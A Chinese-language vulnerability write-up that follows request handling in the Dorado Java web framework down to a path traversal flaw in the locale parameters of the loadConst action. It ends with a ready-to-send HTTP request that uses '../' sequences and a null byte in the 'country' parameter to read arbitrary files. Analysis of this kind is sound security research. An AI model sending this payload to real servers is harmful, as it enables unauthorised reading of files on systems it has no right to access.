        doradoservlet
        *.d
    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
            try {
                ActionHandler.invokeAction(request, response);
            } catch (RuntimeException ex) {
                throw ex;
            } catch (ServletException ex) {
                throw ex;
            } catch (Throwable ex) {
                throw new ServletException(ex);
            }
    }
    public void doPost(HttpServletRequest request, HttpServletResponse response)throws ServletException, IOException {
            doGet(request, response);
    }
这里可以看出来是个基础的HttpServlet类
    public static void invokeAction(HttpServletRequest request,
                HttpServletResponse response) throws Throwable {
            String controllerName = "";
            String actionName = "";
            String extName = null;
            String s = request.getServletPath();
            int lastDot = s.lastIndexOf(".");
            if (lastDot >= 0) {
                extName = s.substring(lastDot + 1);
                s = s.substring(0, lastDot);
                lastDot = s.lastIndexOf(".");
                if (lastDot >= 0) {
                    controllerName = s.substring(0, lastDot);
                    actionName = s.substring(lastDot + 1);
                } else {
                    controllerName = s;
                }
            }
            if ((extName != null) && ("jsp".equals(extName))) {
                return;
            }
            invokeAction(request, response, controllerName, actionName);
        }
        private static void invokeAction(HttpServletRequest request,
                HttpServletResponse response, String controllerName,
                String actionName) throws Throwable {
            Controller controller = null;
            try {
                controller = ControllerManager.getController(request,
                        controllerName);
                controller.invokeAction(actionName, request, response);
            } catch (Throwable ex) {
                if (getExceptionHandler().processGlobalException(ex, request,
                        response))
                    return;
                throw ex;
            }
        }
    }
继续跟进 关键位置我们看类（ControllerManager）的 getController方法
    public static Controller getController(HttpServletRequest request,
                String name) throws Throwable {
            return getControllerFactory().createController(request, name);
        }
继续跟进：
    public Controller createController(HttpServletRequest request, String name)
                throws Throwable {
            Mapping mapping = Mapping.getInstance();
            ControllerConfig config = mapping.findController(name);
            if (config != null) {
                return createController(request, config);
            }
            if ("/TellMeSomethingAboutDorado".equals(name)) {
                Class cl = CacheUtils
                        .getClass("com.bstek.dorado.view.smartweb.v2.output.TranslatorOutputter");
                Controller controller = (Controller) cl.newInstance();
                controller.setName(name);
                controller.setConfig(new ControllerConfig(name));
                return controller;
            }
            if ("/TellMeWhoCreatedDorado".equals(name)) {
                Class cl = CacheUtils
                        .getClass("com.bstek.dorado.view.smartweb.v2.output.EncoderOutputter");
                Controller controller = (Controller) cl.newInstance();
                controller.setName(name);
                controller.setConfig(new ControllerConfig(name));
                return controller;
            }
            throw new ControllerNotFoundException(name);
        }
重点分析一下这一句Mapping mapping = Mapping.getInstance()
初始化了所有的映射关系：
    public static void init() throws xmlParseException, FileNotFoundException,
                IOException {
            try {
                Mapping mapping = new Mapping();
                FileLoader loader = FileLoaderFactory.createConfigLoader();
                String path = "mapping/global.map.xml";
                Console.println("Loading \"" + path + "\"...");
                loader.setFile(path);
                InputStream gin = loader.getInputStream();
                GlobalUnit gunit;
                try {
                    gunit = UnitParser.parseGlobalUnit(mapping, "global", gin);
                } finally {
                    gin.close();
                }
                mapping.addUnit(gunit);
                mapping.setGlobalUnit(gunit);
                int fileCount = gunit.getSubFileCount();
                for (int i = 0; i 
直接跟进这个类
    private Controller createController(HttpServletRequest request,
                ControllerConfig config) throws Throwable {
            Controller controller = createController(config);
            DoradoContext context = HttpContextFactory.getContext(request);
            ScopeHelper.storeobject(context, config.getScope(),
                    "com.bstek.dorado.action.Controller." + config.getName(),
                    controller);
            return controller;
        }
实际上返回的类为：com.bstek.dorado.view.smartweb.v2.ViewServiceController
分析一下controller.invokeAction(actionName,request, response)
    public void invokeAction(String actionName, HttpServletRequest request,
                HttpServletResponse response) throws Throwable {
            internalDispatch(actionName, request, response);
        }
    private void internalDispatch(String actionName,
                HttpServletRequest request, HttpServletResponse response)
                throws Throwable {
            Action action = getAction(actionName, request, response);
            try {
                try {
                    internalDispatch(action, request, response);
                } catch (NoSuchMethodException ex) {
                    String nextActionName = request.getParameter("do");
                    if (StringHelper.isNotEmpty(nextActionName)) {
                        action = getAction(nextActionName, request, response);
                        internalDispatch(action, request, response);
                    }
                } catch (UnsupportedOperationException ex) {
                    if (StringHelper.isEmpty(actionName)) {
                        String nextActionName = request.getParameter("do");
                        if (StringHelper.isNotEmpty(nextActionName)) {
                            action = getAction(nextActionName, request, response);
                            internalDispatch(action, request, response);
                        }
                    }
                }
再继续就不往下分析了，意思就是拿出来刚才控制器里面的方法
框架的流程分析就到这里，直接看业务层，查看ViewServiceController：
    public ActionForward doLoadConst(Action action, HttpServletRequest request,
                HttpServletResponse response) throws Throwable {
            Locale local = LocaleHelper.getLocale(request.getParameter("language"),
                    request.getParameter("country"));
            byte[] ba = getConstByteArray(local);
            ByteArrayInputStream in = new ByteArrayInputStream(ba);
            try {
                responseByteArray(request, response, in, TIMESTAMP,
                        "application/octet-stream", "const.js");
            } finally {
                in.close();
            }
            return null;
        }
    public static Locale getLocale(String language, String country) {
            String key = language + '_' + country;
            Locale locale = (Locale) localeMap.get(key);
            if (locale == null) {
                locale = new Locale(language, country);
                localeMap.put(key, locale);
            }
            return locale;
        }
继续跟进：这时候locale应该是个null 如果url后面的country被构造以后
直接看byte[] ba = getConstByteArray(local); 关键的流程点
    private byte[] getConstByteArray(Locale local) throws IOException {
            byte[] ba = (byte[]) (byte[]) constMap.get(local);
            if (ba == null) {
                ResourceBundle bundle = ResourceManager.getInstance().getBundle(
                        "smartweb/v2/client", local);
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                OutputStreamWriter writer = new OutputStreamWriter(baos);
                Enumeration keys = bundle.getKeys();
                while (keys.hasMoreElements()) {
                    String key = (String) keys.nextElement();
                    String value = bundle.getString(key);
                    value = javascriptHelper.escapejavascript(value);
                    writer.write("var " + key + "=\"");
                    writer.write(value + "\";\n");
                }
                writer.close();
                ba = baos.toByteArray();
                constMap.put(local, ba);
            }
            return ba;
        }
继续跟进这个里面的函数：
    public ResourceBundle getBundle(String baseName, Locale locale) {
            MultiKey multikey = new MultiKey(baseName, locale);
            ResourceBundle bundle = null;
            try {
                if (this.cache != null) {
                    FileCacheWrapper wrapper = (FileCacheWrapper) this.cache
                            .getCachedValue(multikey);
                    if (wrapper != null) {
                        if (!(wrapper.isOvertime()))
                            bundle = (ResourceBundle) wrapper.getobject();
                        else {
                            this.cache.removeElement(multikey);
                        }
                    }
                    if (bundle == null) {
                        wrapper = createBundle(multikey);
                        bundle = (ResourceBundle) wrapper.getobject();
                        ElementWrapper element = this.cache.createElementWrapper(
                                multikey, wrapper);
                        this.cache.putElement(element);
跟进createBundle这个函数：
    private FileCacheWrapper createBundle(MultiKey multikey) throws Exception {
            FileCacheWrapper wrapper = null;
            object[] keys = multikey.getKeys();
            String baseName = (String) keys[0];
            Locale locale = (Locale) keys[1];
            FileLoader loader = FileLoaderFactory.createConfigLoader();
            StringBuffer path = new StringBuffer();
            path.append("i18n");
            path.append("/" + baseName + "_" + locale.getLanguage() + "_"
                    + locale.getCountry() + ".properties");
            loader.setFile(path.toString());
            if (!(loader.exists())) {
                path = new StringBuffer();
                path.append("i18n");
                path.append("/" + baseName + ".properties");
                loader.setFile(path.toString());
            }
            InputStream in = loader.getInputStream();
            try {
                ResourceBundle bundle = new PropertyResourceBundle(in);
                wrapper = new FileCacheWrapper();
                wrapper.setobject(bundle);
                wrapper.setFileLoader(loader);
                wrapper.setTimeout(Setting.getLong("i18n.cache.timeout"));
                wrapper.setMinCheckInterval(Setting
                        .getLong("i18n.cache.minCheckInterval"));
            } finally {
                in.close();
            }
            return wrapper;
        }
这里有个
    public void setFile(String filepath) {
    this.filepath = filepath;
    doSetFile(filepath);
    }
里面进行了路径的拼接，然后剩下的就是一个普通的文件读取操作
直接构造请求：
    GET /sample/dorado/smartweb2.loadConst.d?language=zh&country=CN/../../../../../../../../../../../../../../aaacasdsd.txt%00 HTTP/1.1
    Host: localhost:8080
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Cookie: UM_distinctid=15c78dfcc8237e-0b1ffc25c0572-1263684a-1fa400-15c78dfcc833c4; CNZZDATA80862620=cnzz_eid%3D145476687-1496676251-%26ntime%3D1496676251
    X-Forwarded-For: 8.8.8.8
    Connection: close
    Upgrade-Insecure-Requests: 1